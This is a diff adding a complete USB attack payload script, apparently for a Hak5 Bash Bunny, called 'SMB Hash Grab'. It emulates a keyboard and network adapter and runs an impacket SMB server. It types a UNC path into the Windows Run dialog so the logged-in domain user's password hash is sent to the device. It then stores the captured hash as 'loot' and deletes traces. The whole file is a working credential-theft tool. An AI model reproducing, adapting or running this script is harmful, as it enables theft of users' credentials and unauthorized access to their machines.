@@ -1,0 +1,59 @@
+# Title:         SMB Hash Grab
+# Description:   Exfiltrates current logged in user's password hash (provided it is a domain account) by utalizing default behavior of SMB
+# Author:        Combat_Wombat
+# Props:         Hak5Darren (Who wrote the duck script this was based off of)
+# Version:       1.0
+# Category:      Infiltration
+# Target:        Windows XP SP3+ UNTESTED
+# Attackmodes:   HID, RNDIS_Ethernet
+#REQUIRED: impacket
+
+#FAIL.............Missing Requirement Impacket
+#SETUP............Setup
+#STAGE1...........Setting up SMB server
+#STAGE2...........HID Injection
+#CLEANUP..........Grepping for hash, storing in loot
+#FINISH...........Light is green trap is clean.
+
+# Options
+LOOTDIR=/root/udisk/loot/SMBHashGrab
+SHAREDIR=/tmp/share
+SHARENAME=share
+HOST=\\\\172.16.64.1\\
+#LOG=$LOOTDIR/$TARGET_HOSTNAME.log
+######## SETUP STAGE ########
+REQUIRETOOL impacket
+LED SETUP
+mkdir -p $SHAREDIR
+
+######## ATTACK STAGE 1########
+LED STAGE1
+ATTACKMODE HID RNDIS_ETHERNET
+Q DELAY 150
+GET TARGET_HOSTNAME
+cd /tools/impacket/examples/ && python smbserver.py $SHARENAME $SHAREDIR >> $SHAREDIR/$TARGET_HOSTNAME.txt &
+Q DELAY 400
+
+######## HID STAGE 2########
+LED STAGE2
+
+#HID Injection begins by directing the client to the host
+Q GUI r
+Q DELAY 100
+Q STRING $HOST
+Q ENTER
+Q DELAY 1100
+Q ALT F4
+
+######## CLEANUP STAGE ########
+LED CLEANUP
+#If you are having trouble finding the lootdir, try uncommenting the next line
+#mount -o sync /dev/nandf /root/udisk
+mkdir -p $LOOTDIR
+grep -a :: $SHAREDIR/$TARGET_HOSTNAME.txt >> $LOOTDIR/$TARGET_HOSTNAME.txt
+disown
+rm -rf $SHAREDIR
+sync
+
+######## LIGHT IS GREEN TRAP IS CLEAN ########
+LED FINISH
